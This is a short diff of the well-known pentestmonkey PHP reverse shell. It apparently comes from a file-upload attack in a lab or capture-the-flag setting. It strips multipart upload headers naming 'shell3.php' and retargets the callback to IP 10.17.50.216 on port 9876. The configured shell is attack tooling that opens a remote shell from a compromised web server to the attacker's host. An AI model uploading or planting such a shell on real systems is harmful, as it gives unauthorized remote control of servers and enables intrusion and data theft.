@@ -1,7 +1,3 @@
------------------------------340151005117730870021873244095
-Content-Disposition: form-data; name="fileToUpload"; filename="shell3.php"
-Content-Type: application/x-php
-
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -50,8 +46,8 @@ Content-Type: application/x-php
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.17.50.216';  // CHANGE THIS
-$port = 4444;       // CHANGE THIS
+$ip = '10.17.50.216'; 	// CHANGE THIS
+$port = 9876;       	// CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
